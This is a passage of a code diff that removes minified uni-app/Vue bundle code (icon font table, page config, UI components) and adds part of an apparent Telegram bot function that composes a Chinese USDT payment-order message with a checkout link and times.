       return n;
     }
-    o.default.config.productionTip = !1, a.default.mpType = "app";
-    var u = new o.default(function (e) {
-      for (var t = 1; t < arguments.length; t++) {
-        var n = null != arguments[t] ? arguments[t] : {};
-        t % 2 ? s(Object(n), !0).forEach(function (t) {
-          (0, i.default)(e, t, n[t]);
-        }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : s(Object(n)).forEach(function (t) {
-          Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t));
-        });
-      }
-      return e;
-    }({}, a.default));
-    u.$mount();
-  },
-  d418: function (e, t, n) {
-    "use strict";
-
-    n.r(t);
-    var r = n("7173"),
-      i = n("c5e5");
-    for (var o in i) ["default"].indexOf(o) < 0 && function (e) {
-      n.d(t, e, function () {
-        return i[e];
-      });
-    }(o);
-    var a = n("828b"),
-      s = Object(a["a"])(i["default"], r["b"], r["c"], !1, null, null, null, !1, r["a"], void 0);
-    t["default"] = s.exports;
-  },
-  d551: function (e, t, n) {
-    var r = n("3b2d")["default"],
-      i = n("e6db");
-    e.exports = function (e) {
-      var t = i(e, "string");
-      return "symbol" == r(t) ? t : t + "";
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  d674: function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.fontData = void 0;
-    t.fontData = [{
-      font_class: "arrow-down",
-      unicode: "\uE6BE"
-    }, {
-      font_class: "arrow-left",
-      unicode: "\uE6BC"
-    }, {
-      font_class: "arrow-right",
-      unicode: "\uE6BB"
-    }, {
-      font_class: "arrow-up",
-      unicode: "\uE6BD"
-    }, {
-      font_class: "auth",
-      unicode: "\uE6AB"
-    }, {
-      font_class: "auth-filled",
-      unicode: "\uE6CC"
-    }, {
-      font_class: "back",
-      unicode: "\uE6B9"
-    }, {
-      font_class: "bars",
-      unicode: "\uE627"
-    }, {
-      font_class: "calendar",
-      unicode: "\uE6A0"
-    }, {
-      font_class: "calendar-filled",
-      unicode: "\uE6C0"
-    }, {
-      font_class: "camera",
-      unicode: "\uE65A"
-    }, {
-      font_class: "camera-filled",
-      unicode: "\uE658"
-    }, {
-      font_class: "cart",
-      unicode: "\uE631"
-    }, {
-      font_class: "cart-filled",
-      unicode: "\uE6D0"
-    }, {
-      font_class: "chat",
-      unicode: "\uE65D"
-    }, {
-      font_class: "chat-filled",
-      unicode: "\uE659"
-    }, {
-      font_class: "chatboxes",
-      unicode: "\uE696"
-    }, {
-      font_class: "chatboxes-filled",
-      unicode: "\uE692"
-    }, {
-      font_class: "chatbubble",
-      unicode: "\uE697"
-    }, {
-      font_class: "chatbubble-filled",
-      unicode: "\uE694"
-    }, {
-      font_class: "checkbox",
-      unicode: "\uE62B"
-    }, {
-      font_class: "checkbox-filled",
-      unicode: "\uE62C"
-    }, {
-      font_class: "checkmarkempty",
-      unicode: "\uE65C"
-    }, {
-      font_class: "circle",
-      unicode: "\uE65B"
-    }, {
-      font_class: "circle-filled",
-      unicode: "\uE65E"
-    }, {
-      font_class: "clear",
-      unicode: "\uE66D"
-    }, {
-      font_class: "close",
-      unicode: "\uE673"
-    }, {
-      font_class: "closeempty",
-      unicode: "\uE66C"
-    }, {
-      font_class: "cloud-download",
-      unicode: "\uE647"
-    }, {
-      font_class: "cloud-download-filled",
-      unicode: "\uE646"
-    }, {
-      font_class: "cloud-upload",
-      unicode: "\uE645"
-    }, {
-      font_class: "cloud-upload-filled",
-      unicode: "\uE648"
-    }, {
-      font_class: "color",
-      unicode: "\uE6CF"
-    }, {
-      font_class: "color-filled",
-      unicode: "\uE6C9"
-    }, {
-      font_class: "compose",
-      unicode: "\uE67F"
-    }, {
-      font_class: "contact",
-      unicode: "\uE693"
-    }, {
-      font_class: "contact-filled",
-      unicode: "\uE695"
-    }, {
-      font_class: "down",
-      unicode: "\uE6B8"
-    }, {
-      font_class: "bottom",
-      unicode: "\uE6B8"
-    }, {
-      font_class: "download",
-      unicode: "\uE68D"
-    }, {
-      font_class: "download-filled",
-      unicode: "\uE681"
-    }, {
-      font_class: "email",
-      unicode: "\uE69E"
-    }, {
-      font_class: "email-filled",
-      unicode: "\uE69A"
-    }, {
-      font_class: "eye",
-      unicode: "\uE651"
-    }, {
-      font_class: "eye-filled",
-      unicode: "\uE66A"
-    }, {
-      font_class: "eye-slash",
-      unicode: "\uE6B3"
-    }, {
-      font_class: "eye-slash-filled",
-      unicode: "\uE6B4"
-    }, {
-      font_class: "fire",
-      unicode: "\uE6A1"
-    }, {
-      font_class: "fire-filled",
-      unicode: "\uE6C5"
-    }, {
-      font_class: "flag",
-      unicode: "\uE65F"
-    }, {
-      font_class: "flag-filled",
-      unicode: "\uE660"
-    }, {
-      font_class: "folder-add",
-      unicode: "\uE6A9"
-    }, {
-      font_class: "folder-add-filled",
-      unicode: "\uE6C8"
-    }, {
-      font_class: "font",
-      unicode: "\uE6A3"
-    }, {
-      font_class: "forward",
-      unicode: "\uE6BA"
-    }, {
-      font_class: "gear",
-      unicode: "\uE664"
-    }, {
-      font_class: "gear-filled",
-      unicode: "\uE661"
-    }, {
-      font_class: "gift",
-      unicode: "\uE6A4"
-    }, {
-      font_class: "gift-filled",
-      unicode: "\uE6C4"
-    }, {
-      font_class: "hand-down",
-      unicode: "\uE63D"
-    }, {
-      font_class: "hand-down-filled",
-      unicode: "\uE63C"
-    }, {
-      font_class: "hand-up",
-      unicode: "\uE63F"
-    }, {
-      font_class: "hand-up-filled",
-      unicode: "\uE63E"
-    }, {
-      font_class: "headphones",
-      unicode: "\uE630"
-    }, {
-      font_class: "heart",
-      unicode: "\uE639"
-    }, {
-      font_class: "heart-filled",
-      unicode: "\uE641"
-    }, {
-      font_class: "help",
-      unicode: "\uE679"
-    }, {
-      font_class: "help-filled",
-      unicode: "\uE674"
-    }, {
-      font_class: "home",
-      unicode: "\uE662"
-    }, {
-      font_class: "home-filled",
-      unicode: "\uE663"
-    }, {
-      font_class: "image",
-      unicode: "\uE670"
-    }, {
-      font_class: "image-filled",
-      unicode: "\uE678"
-    }, {
-      font_class: "images",
-      unicode: "\uE650"
-    }, {
-      font_class: "images-filled",
-      unicode: "\uE64B"
-    }, {
-      font_class: "info",
-      unicode: "\uE669"
-    }, {
-      font_class: "info-filled",
-      unicode: "\uE649"
-    }, {
-      font_class: "left",
-      unicode: "\uE6B7"
-    }, {
-      font_class: "link",
-      unicode: "\uE6A5"
-    }, {
-      font_class: "list",
-      unicode: "\uE644"
-    }, {
-      font_class: "location",
-      unicode: "\uE6AE"
-    }, {
-      font_class: "location-filled",
-      unicode: "\uE6AF"
-    }, {
-      font_class: "locked",
-      unicode: "\uE66B"
-    }, {
-      font_class: "locked-filled",
-      unicode: "\uE668"
-    }, {
-      font_class: "loop",
-      unicode: "\uE633"
-    }, {
-      font_class: "mail-open",
-      unicode: "\uE643"
-    }, {
-      font_class: "mail-open-filled",
-      unicode: "\uE63A"
-    }, {
-      font_class: "map",
-      unicode: "\uE667"
-    }, {
-      font_class: "map-filled",
-      unicode: "\uE666"
-    }, {
-      font_class: "map-pin",
-      unicode: "\uE6AD"
-    }, {
-      font_class: "map-pin-ellipse",
-      unicode: "\uE6AC"
-    }, {
-      font_class: "medal",
-      unicode: "\uE6A2"
-    }, {
-      font_class: "medal-filled",
-      unicode: "\uE6C3"
-    }, {
-      font_class: "mic",
-      unicode: "\uE671"
-    }, {
-      font_class: "mic-filled",
-      unicode: "\uE677"
-    }, {
-      font_class: "micoff",
-      unicode: "\uE67E"
-    }, {
-      font_class: "micoff-filled",
-      unicode: "\uE6B0"
-    }, {
-      font_class: "minus",
-      unicode: "\uE66F"
-    }, {
-      font_class: "minus-filled",
-      unicode: "\uE67D"
-    }, {
-      font_class: "more",
-      unicode: "\uE64D"
-    }, {
-      font_class: "more-filled",
-      unicode: "\uE64E"
-    }, {
-      font_class: "navigate",
-      unicode: "\uE66E"
-    }, {
-      font_class: "navigate-filled",
-      unicode: "\uE67A"
-    }, {
-      font_class: "notification",
-      unicode: "\uE6A6"
-    }, {
-      font_class: "notification-filled",
-      unicode: "\uE6C1"
-    }, {
-      font_class: "paperclip",
-      unicode: "\uE652"
-    }, {
-      font_class: "paperplane",
-      unicode: "\uE672"
-    }, {
-      font_class: "paperplane-filled",
-      unicode: "\uE675"
-    }, {
-      font_class: "person",
-      unicode: "\uE699"
-    }, {
-      font_class: "person-filled",
-      unicode: "\uE69D"
-    }, {
-      font_class: "personadd",
-      unicode: "\uE69F"
-    }, {
-      font_class: "personadd-filled",
-      unicode: "\uE698"
-    }, {
-      font_class: "personadd-filled-copy",
-      unicode: "\uE6D1"
-    }, {
-      font_class: "phone",
-      unicode: "\uE69C"
-    }, {
-      font_class: "phone-filled",
-      unicode: "\uE69B"
-    }, {
-      font_class: "plus",
-      unicode: "\uE676"
-    }, {
-      font_class: "plus-filled",
-      unicode: "\uE6C7"
-    }, {
-      font_class: "plusempty",
-      unicode: "\uE67B"
-    }, {
-      font_class: "pulldown",
-      unicode: "\uE632"
-    }, {
-      font_class: "pyq",
-      unicode: "\uE682"
-    }, {
-      font_class: "qq",
-      unicode: "\uE680"
-    }, {
-      font_class: "redo",
-      unicode: "\uE64A"
-    }, {
-      font_class: "redo-filled",
-      unicode: "\uE655"
-    }, {
-      font_class: "refresh",
-      unicode: "\uE657"
-    }, {
-      font_class: "refresh-filled",
-      unicode: "\uE656"
-    }, {
-      font_class: "refreshempty",
-      unicode: "\uE6BF"
-    }, {
-      font_class: "reload",
-      unicode: "\uE6B2"
-    }, {
-      font_class: "right",
-      unicode: "\uE6B5"
-    }, {
-      font_class: "scan",
-      unicode: "\uE62A"
-    }, {
-      font_class: "search",
-      unicode: "\uE654"
-    }, {
-      font_class: "settings",
-      unicode: "\uE653"
-    }, {
-      font_class: "settings-filled",
-      unicode: "\uE6CE"
-    }, {
-      font_class: "shop",
-      unicode: "\uE62F"
-    }, {
-      font_class: "shop-filled",
-      unicode: "\uE6CD"
-    }, {
-      font_class: "smallcircle",
-      unicode: "\uE67C"
-    }, {
-      font_class: "smallcircle-filled",
-      unicode: "\uE665"
-    }, {
-      font_class: "sound",
-      unicode: "\uE684"
-    }, {
-      font_class: "sound-filled",
-      unicode: "\uE686"
-    }, {
-      font_class: "spinner-cycle",
-      unicode: "\uE68A"
-    }, {
-      font_class: "staff",
-      unicode: "\uE6A7"
-    }, {
-      font_class: "staff-filled",
-      unicode: "\uE6CB"
-    }, {
-      font_class: "star",
-      unicode: "\uE688"
-    }, {
-      font_class: "star-filled",
-      unicode: "\uE68F"
-    }, {
-      font_class: "starhalf",
-      unicode: "\uE683"
-    }, {
-      font_class: "trash",
-      unicode: "\uE687"
-    }, {
-      font_class: "trash-filled",
-      unicode: "\uE685"
-    }, {
-      font_class: "tune",
-      unicode: "\uE6AA"
-    }, {
-      font_class: "tune-filled",
-      unicode: "\uE6CA"
-    }, {
-      font_class: "undo",
-      unicode: "\uE64F"
-    }, {
-      font_class: "undo-filled",
-      unicode: "\uE64C"
-    }, {
-      font_class: "up",
-      unicode: "\uE6B6"
-    }, {
-      font_class: "top",
-      unicode: "\uE6B6"
-    }, {
-      font_class: "upload",
-      unicode: "\uE690"
-    }, {
-      font_class: "upload-filled",
-      unicode: "\uE68E"
-    }, {
-      font_class: "videocam",
-      unicode: "\uE68C"
-    }, {
-      font_class: "videocam-filled",
-      unicode: "\uE689"
-    }, {
-      font_class: "vip",
-      unicode: "\uE6A8"
-    }, {
-      font_class: "vip-filled",
-      unicode: "\uE6C6"
-    }, {
-      font_class: "wallet",
-      unicode: "\uE6B1"
-    }, {
-      font_class: "wallet-filled",
-      unicode: "\uE6C2"
-    }, {
-      font_class: "weibo",
-      unicode: "\uE68B"
-    }, {
-      font_class: "weixin",
-      unicode: "\uE691"
-    }];
-  },
-  d754: function (e, t, n) {
-    "use strict";
-
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    t.default = {
-      pages: [{
-        path: "pages/index",
-        style: {
-          enablePullDownRefresh: !1,
-          navigationStyle: "custom",
-          "app-plus": {
-            titleView: !1,
-            bounce: "none"
-          }
-        }
-      }, {
-        path: "pages/kong/kong",
-        style: {
-          navigationBarTitleText: "",
-          enablePullDownRefresh: !1
-        }
-      }, {
-        path: "pages/kong/kong2",
-        style: {
-          navigationStyle: "custom",
-          navigationBarTitleText: "",
-          enablePullDownRefresh: !1,
-          "app-plus": {
-            titleNView: {
-              titleSize: "18px",
-              autoBackButton: !1
-            }
-          }
-        }
-      }],
-      globalStyle: {
-        navigationBarTextStyle: "black",
-        navigationBarTitleText: "uni-app",
-        navigationBarBackgroundColor: "#F8F8F8",
-        backgroundColor: "#F8F8F8"
-      }
+    const P = E + "/pay?id=" + q.unique_id + "&amount=" + I.toFixed(6),
+      O = new Date(),
+      s = new Date(O.getTime() + 600000),
+      d = G => {
+        const o = G.getFullYear(),
+          i = String(G.getMonth() + 1).padStart(2, "0"),
+          Q = String(G.getDate()).padStart(2, "0"),
+          T = String(G.getHours()).padStart(2, "0"),
+          C = String(G.getMinutes()).padStart(2, "0");
+        return o + "-" + i + "-" + Q + " " + T + ":" + C;
+      },
+      A = d(O),
+      M = d(s),
+      L = "<b>订单创建成功✅</b>\n<b>金额: </b><code>" + I + "</code> <b>USDT</b>\n<b>💰收银台：</b><a href=\"" + P + "\"><u>立即付款</u></a>\n<b>订单创建时间：</b><code>" + A + "</code>\n<b>订单结束时间：</b><code>" + M + "</code>",
+      Y = {};
+    Y.parse_mode = "HTML";
+    Y.disable_web_page_preview = true;
+    const V = {};
+    V.text = L;
+    V.options = Y;
+    return V;
+  } catch (G) {
+    console.error("[" + getTimeInfo().time + "] 处理收款请求错误:", G);
+    const S = {
+      text: "❌ 处理收款请求时出现错误，请稍后重试",
+      options: {}
     };
-  },
-  db14: function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return i;
-    }), n.d(t, "c", function () {
-      return o;
-    }), n.d(t, "a", function () {
-      return r;
-    });
-    var r = {
-        uniLoadMore: n("346c").default
-      },
-      i = function () {
-        var e = this,
-          t = e.$createElement,
-          n = e._self._c || t;
-        return n("view", {
-          staticClass: e._$s(0, "sc", "uni-data-checklist"),
-          style: e._$s(0, "s", {
-            "margin-top": e.isTop + "px"
-          }),
-          attrs: {
-            _i: 0
-          }
-        }, [e._$s(1, "i", !e.isLocal) ? [n("view", {
-          staticClass: e._$s(2, "sc", "uni-data-loading"),
-          attrs: {
-            _i: 2
-          }
-        }, [e._$s(3, "i", !e.mixinDatacomErrorMessage) ? n("uni-load-more", {
-          attrs: {
-            status: "loading",
-            iconType: "snow",
-            iconSize: 18,
-            "content-text": e.contentText,
-            _i: 3
-          }
-        }) : n("text", {
-          attrs: {
-            _i: 4
-          }
-        }, [e._v(e._$s(4, "t0-0", e._s(e.mixinDatacomErrorMessage)))])], 1)] : [e._$s(6, "i", e.multiple) ? n("checkbox-group", {
-          staticClass: e._$s(6, "sc", "checklist-group"),
-          class: e._$s(6, "c", {
-            "is-list": "list" === e.mode || e.wrap
-          }),
-          attrs: {
-            _i: 6
-          },
-          on: {
-            change: e.chagne
-          }
-        }, e._l(e._$s(7, "f", {
-          forItems: e.dataList
-        }), function (t, r, i, o) {
-          return n("label", {
-            key: e._$s(7, "f", {
-              forIndex: i,
-              key: r
-            }),
-            staticClass: e._$s("7-" + o, "sc", "checklist-box"),
-            class: e._$s("7-" + o, "c", ["is--" + e.mode, t.selected ? "is-checked" : "", e.disabled || t.disabled ? "is-disable" : "", 0 !== r && "list" === e.mode ? "is-list-border" : ""]),
-            style: e._$s("7-" + o, "s", t.styleBackgroud),
-            attrs: {
-              _i: "7-" + o
-            }
-          }, [n("checkbox", {
-            staticClass: e._$s("8-" + o, "sc", "hidden"),
-            attrs: {
-              disabled: e._$s("8-" + o, "a-disabled", e.disabled || !!t.disabled),
-              value: e._$s("8-" + o, "a-value", t[e.map.value] + ""),
-              checked: e._$s("8-" + o, "a-checked", t.selected),
-              _i: "8-" + o
-            }
-          }), e._$s("9-" + o, "i", "tag" !== e.mode && "list" !== e.mode || "list" === e.mode && "left" === e.icon) ? n("view", {
-            staticClass: e._$s("9-" + o, "sc", "checkbox__inner"),
-            style: e._$s("9-" + o, "s", t.styleIcon),
-            attrs: {
-              _i: "9-" + o
-            }
-          }, [n("view", {
-            staticClass: e._$s("10-" + o, "sc", "checkbox__inner-icon"),
-            attrs: {
-              _i: "10-" + o
-            }
-          })]) : e._e(), n("view", {
-            staticClass: e._$s("11-" + o, "sc", "checklist-content"),
-            class: e._$s("11-" + o, "c", {
-              "list-content": "list" === e.mode && "left" === e.icon
-            }),
-            attrs: {
-              _i: "11-" + o
-            }
-          }, [n("text", {
-            staticClass: e._$s("12-" + o, "sc", "checklist-text"),
-            style: e._$s("12-" + o, "s", t.styleIconText),
-            attrs: {
-              _i: "12-" + o
-            }
-          }, [e._v(e._$s("12-" + o, "t0-0", e._s(t[e.map.text])))]), e._$s("13-" + o, "i", "list" === e.mode && "right" === e.icon) ? n("view", {
-            staticClass: e._$s("13-" + o, "sc", "checkobx__list"),
-            style: e._$s("13-" + o, "s", t.styleBackgroud),
-            attrs: {
-              _i: "13-" + o
-            }
-          }) : e._e()])]);
-        }), 0) : n("radio-group", {
-          staticClass: e._$s(14, "sc", "checklist-group"),
-          class: e._$s(14, "c", {
-            "is-list": "list" === e.mode,
-            "is-wrap": e.wrap
-          }),
-          attrs: {
-            _i: 14
-          },
-          on: {
-            change: e.chagne
-          }
-        }, e._l(e._$s(15, "f", {
-          forItems: e.dataList
-        }), function (t, r, i, o) {
-          return n("label", {
-            directives: [{
-              name: "show",
-              rawName: "v-show",
-              value: e._$s("15-" + o, "v-show", r >= e.mins & r <= e.maxs),
-              expression: "_$s((\"15-\"+$31),'v-show',index>=mins&index<=maxs)"
-            }],
-            key: e._$s(15, "f", {
-              forIndex: i,
-              key: r
-            }),
-            staticClass: e._$s("15-" + o, "sc", "checklist-box"),
-            class: e._$s("15-" + o, "c", ["is--" + e.mode, t.selected ? "is-checked" : "", e.disabled || t.disabled ? "is-disable" : "", 0 !== r && "list" === e.mode ? "is-list-border" : ""]),
-            style: e._$s("15-" + o, "s", t.styleBackgroud),
-            attrs: {
-              _i: "15-" + o
-            }
-          }, [n("radio", {
-            staticClass: e._$s("16-" + o, "sc", "hidden"),
-            attrs: {
-              disabled: e._$s("16-" + o, "a-disabled", e.disabled || t.disabled),
-              value: e._$s("16-" + o, "a-value", t[e.map.value] + ""),
-              checked: e._$s("16-" + o, "a-checked", t.selected),
-              _i: "16-" + o
-            }
-          }), n("view", {
-            staticClass: e._$s("17-" + o, "sc", "checklist-content"),
-            class: e._$s("17-" + o, "c", {
-              "list-content": "list" === e.mode && "left" === e.icon
-            }),
-            attrs: {
-              _i: "17-" + o
-            }
-          }, [n("text", {
-            staticClass: e._$s("18-" + o, "sc", "checklist-text"),
-            style: e._$s("18-" + o, "s", t.styleIconText),
-            attrs: {
-              _i: "18-" + o
-            }
-          }, [e._v(e._$s("18-" + o, "t0-0", e._s(t[e.map.text])))]), e._$s("19-" + o, "i", "list" === e.mode && "right" === e.icon) ? n("view", {
-            staticClass: e._$s("19-" + o, "sc", "checkobx__list"),
-            style: e._$s("19-" + o, "s", t.styleRightIcon),
-            attrs: {
-              _i: "19-" + o
-            }
-          }) : e._e()]), e._$s("20-" + o, "i", "tag" !== e.mode && "list" !== e.mode || "list" === e.mode && "left" === e.icon) ? n("view", {
-            staticClass: e._$s("20-" + o, "sc", "radio__inner"),
-            style: e._$s("20-" + o, "s", t.styleBackgroud),
-            attrs: {
-              _i: "20-" + o
-            }
-          }, [n("view", {
-            staticClass: e._$s("21-" + o, "sc", "radio__inner-icon"),
-            style: e._$s("21-" + o, "s", t.styleIcon),
-            attrs: {
-              _i: "21-" + o
-            }
-          })]) : e._e()]);
-        }), 0)]], 2);
-      },
-      o = [];
-  },
-  dd3e: function (e, t) {
-    e.exports = function () {
-      throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  dfeb: function (e, t, n) {
-    "use strict";
-
-    n.d(t, "b", function () {
-      return r;
-    }), n.d(t, "c", function () {
-      return i;
-    }), n.d(t, "a", function () {});
-    var r = function () {
-        var e = this,
-          t = e.$createElement,
-          n = e._self._c || t;
-        return n("view", {
-          directives: [{
-            name: "show",
-            rawName: "v-show",
-            value: e._$s(0, "v-show", e.showPopup),
-            expression: "_$s(0,'v-show',showPopup)"
-          }],
-          attrs: {
-            _i: 0
-          },
-          on: {
-            touchmove: function (t) {
-              return t.stopPropagation(), t.preventDefault(), e.clear(t);
-            }
-          }
-        }, [n("view", {
-          staticClass: e._$s(1, "sc", "popup_mask"),
-          attrs: {
-            _i: 1
-          },
-          on: {
-            touchmove: function (t) {
-              return t.stopPropagation(), t.preventDefault(), e.clear(t);
-            }
-          }
-        }), n("view", {
-          staticClass: e._$s(2, "sc", "popup_content"),
-          attrs: {
-            _i: 2
-          }
-        }, [n("view", {
-          staticClass: e._$s(3, "sc", "title"),
-          attrs: {
-            _i: 3
-          }
-        }), n("view", {
-          staticClass: e._$s(4, "sc", "explain_text"),
-          attrs: {
-            _i: 4
-          }
-        }, [n("view", {
-          staticClass: e._$s(5, "sc", "explain_text"),
-          attrs: {
-            _i: 5
-          }
-        }), n("view", {
-          staticClass: e._$s(6, "sc", "explain_text"),
-          attrs: {
-            _i: 6
-          }
-        }), n("view", {
-          staticClass: e._$s(7, "sc", "explain_text"),
-          attrs: {
-            _i: 7
-          }
-        }), n("view", {
-          staticClass: e._$s(8, "sc", "explain_text"),
-          attrs: {
-            _i: 8
-          }
-        }), n("view", {
-          staticClass: e._$s(9, "sc", "explain_text"),
-          attrs: {
-            _i: 9
-          }
-        })]), n("view", {
-          staticClass: e._$s(10, "sc", "button"),
-          attrs: {
-            _i: 10
-          }
-        }, [n("view", {
-          attrs: {
-            _i: 11
-          },
-          on: {
-            click: e.back
-          }
-        }), n("view", {
-          attrs: {
-            _i: 12
-          },
-          on: {
-            click: e.confirm
-          }
-        })])])]);
-      },
-      i = [];
-  },
-  e3c6: function (e, t, n) {
-    "use strict";
-
-    var r = n("47a9");
-    Object.defineProperty(t, "__esModule", {
-      value: !0
-    }), t.default = void 0;
-    var i = r(n("9e17")),
-      o = function (e) {
-        return "number" === typeof e ? e + "px" : e;
-      },
-      a = {
-        name: "UniNavBar",
-        components: {
-          statusBar: i.default
-        },
-        emits: ["clickLeft", "clickRight", "clickTitle"],
-        props: {
-          dark: {
-            type: Boolean,
-            default: !1
-          },
-          title: {
-            type: String,
-            default: ""
-          },
-          leftText: {
-            type: String,
-            default: ""
-          },
-          rightText: {
-            type: String,
-            default: ""
-          },
-          leftIcon: {
-            type: String,
-            default: ""
-          },
-          rightIcon: {
-            type: String,
-            default: ""
-          },
-          fixed: {
-            type: [Boolean, String],
-            default: !1
-          },
-          color: {
-            type: String,
-            default: ""
-          },
-          backgroundColor: {
-            type: String,
-            default: ""
-          },
-          statusBar: {
-            type: [Boolean, String],
-            default: !1
-          },
-          shadow: {
-            type: [Boolean, String],
-            default: !1
-          },
-          border: {
-            type: [Boolean, String],
-            default: !0
-          },
-          height: {
-            type: [Number, String],
-            default: 40
-          },
-          leftWidth: {
-            type: [Number, String],
-            default: 60
-          },
-          rightWidth: {
-            type: [Number, String],
-            default: 60
-          },
-          stat: {
-            type: [Boolean, String],
-            default: ""
-          }
-        },
-        computed: {
-          themeBgColor: function () {
-            return this.dark ? this.backgroundColor ? this.backgroundColor : this.dark ? "#333" : "#FFF" : this.backgroundColor || "#FFF";
-          },
-          themeColor: function () {
-            return this.dark ? this.color ? this.color : this.dark ? "#fff" : "#333" : this.color || "#333";
-          },
-          navbarHeight: function () {
-            return o(this.height);
-          },
-          leftIconWidth: function () {
-            return o(this.leftWidth);
-          },
-          rightIconWidth: function () {
-            return o(this.rightWidth);
-          }
-        },
-        mounted: function () {
-          uni.report && this.stat && "" !== this.title && uni.report("title", this.title);
-        },
-        methods: {
-          onClickLeft: function () {
-            this.$emit("clickLeft");
-          },
-          onClickRight: function () {
-            this.$emit("clickRight");
-          },
-          onClickTitle: function () {
-            this.$emit("clickTitle");
-          }
-        }
-      };
-    t.default = a;
-  },
-  e6db: function (e, t, n) {
-    var r = n("3b2d")["default"];
-    e.exports = function (e, t) {
-      if ("object" != r(e) || !e) return e;
-      var n = e[Symbol.toPrimitive];
-      if (void 0 !== n) {
-        var i = n.call(e, t || "default");
-        if ("object" != r(i)) return i;
-        throw new TypeError("@@toPrimitive must return a primitive value.");
-      }
-      return ("string" === t ? String : Number)(e);
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  ed45: function (e, t) {
-    e.exports = function (e) {
-      if (Array.isArray(e)) return e;
-    }, e.exports.__esModule = !0, e.exports["default"] = e.exports;
-  },
-  ed83: function (e, t, n) {
-    "use strict";
-
-    (function (e) {
-      var r = n("47a9");
-      Object.defineProperty(t, "__esModule", {
-        value: !0
-      }), t.Behavior = function (e) {
-        return e;
-      }, t.Component = function (t) {
-        var n = function (t) {
-          var n = t.data,
-            r = t.options,
-            i = t.methods,
-            o = t.behaviors,
-            a = t.lifetimes,
-            s = t.observers,
-            l = t.relations,
-            f = t.properties,
-            h = t.pageLifetimes,
-            p = t.externalClasses,
-            g = {
-              mixins: [],
-              props: {},
-              watch: {},
-              mpOptions: {
-                mpObservers: []
-              }
-            };
-          return c(g), u(n, g), function (e, t) {
-            if (!e) return;
-            t.mpOptions.options = e;
-          }(r, g), S(i, g), I(o, g), function (e, t) {
-            if (!e) return;
-            O(e, t);
-          }(a, g), function (e, t) {
-            if (!e) return;
-            var n = t.mpOptions.mpObservers;
-            Object.keys(e).forEach(function (t) {
-              n.push({
-                paths: C(t),
-                observer: e[t]
-              });
-            });
-          }(s, g), function (t, n) {
-            if (!t) return;
-            Object.keys(t).forEach(function (n) {
-              var r = t[n];
-              r.name = n, r.target = r.target ? String(r.target) : function (e, t) {
-                0 === t.indexOf("/") && (e = "");
-                var n = e.split("/"),
-                  r = t.split("/");
-                n.pop();
-                while (r.length) {
-                  var i = r.shift();
-                  "" !== i && "." !== i && (".." !== i ? n.push(i) : n.pop());
-                }
-                return n.join("/");
-              }(e.__wxRoute, n);
-            }), n.mpOptions.relations = t;
-          }(l, g), k(f, g), function (e, t) {
-            if (!e) return;
-            b.forEach(function (n) {
-              var r = e[n];
-              d(r) && (t[w[n]] = r);
-            });
-          }(h, g), function (e, t) {
-            if (!e) return;
-            Array.isArray(e) || (e = [e]);
-            t.mpOptions.externalClasses = e, t.mpOptions.properties || (t.mpOptions.properties = Object.create(null));
-            e.forEach(function (e) {
-              t.mpOptions.properties[m(e)] = {
-                type: String,
-                value: ""
-              };
-            });
-          }(p, g), O(t, g), P(t), g;
-        }(t);
-        n.mixins.unshift(G), n.mpOptions.path = e.__wxRoute, function (e) {
-          e.onServiceAttached || (e.onServiceAttached = []);
-          e.onServiceAttached.push(function () {
-            R(this, "linked");
-          });
-        }(n), e.__wxComponents[e.__wxRoute] = n;
-      }, t.Page = function (t) {
-        var n = function (e) {
-          var t = {
-            mixins: [],
-            mpOptions: {}
-          };
-          return c(t), u(e.data, t), function (e, t) {
-            var n = Object.create(null);
-            Object.keys(e).forEach(function (t) {
-              var r = e[t];
-              d(r) && -1 === x.indexOf(t) && (n[t] = r);
-            }), t.methods = n;
-          }(e, t), function (e, t) {
-            Object.keys(e).forEach(function (n) {
-              -1 !== x.indexOf(n) && (t[n] = e[n]);
-            });
-          }(e, t), t;
-        }(t);
-        n.mixins.unshift(G), n.mpOptions.path = e.__wxRoute, e.__wxComponents[e.__wxRoute] = n;
-      }, t.nextTick = t.default = void 0;
-      var i,
-        o = r(n("7ca3")),
-        a = r(n("34cf")),
-        s = r(n("951c"));
-      function u(e, t) {
-        e && (t.mpOptions.data = e);
-      }
-      function c(t) {
-        t.components = e.__wxVueOptions.components;
-      }
-      var l = Object.prototype.toString,
-        f = Object.prototype.hasOwnProperty;
-      function d(e) {
-        return "function" === typeof e;
-      }
-      function h(e) {
-        return "[object Object]" === l.call(e);
-      }
-      function p(e, t) {
-        return f.call(e, t);
-      }
-      function g() {}
-      var v = /-(\w)/g,
-        m = function (e) {
-          var t = Object.create(null);
-          return function (n) {
-            var r = t[n];
-            return r || (t[n] = e(n));
-          };
-        }(function (e) {
-          return e.replace(v, function (e, t) {
-            return t ? t.toUpperCase() : "";
-          });
-        }),
-        _ = {
-          created: "onServiceCreated",
-          attached: "onServiceAttached",
-          ready: "mounted",
-          moved: "moved",
-          detached: "destroyed"
-        },
-        y = Object.keys(_),
-        w = {
-          show: "onPageShow",
-          hide: "onPageHide",
-          resize: "onPageResize"
-        },
-        b = Object.keys(w),
-        x = ["onLoad", "onShow", "onReady", "onHide", "onUnload", "onPullDownRefresh", "onReachBottom", "onShareAppMessage", "onPageScroll", "onResize", "onTabItemTap"];
-      function k(e, t) {
-        e && (t.mpOptions.properties = e);
-      }
-      function S(e, t) {
-        e && (e.$emit && (console.warn("Method \"$emit\" conflicts with an existing Vue instance method"), delete e.$emit), t.methods = e);
-      }
-      function O(e, t) {
-        y.forEach(function (n) {
-          p(e, n) && (t[_[n]] || (t[_[n]] = [])).push(e[n]);
-        });
-      }
-      var T = {
-        "wx://form-field": {},
-        "wx://component-export": {}
-      };
-      function P(e, t) {
-        (function (e) {
-          var t = e.behaviors,
-            n = e.definitionFilter,
-            r = [];
-          if (Array.isArray(t) && t.forEach(function (t) {
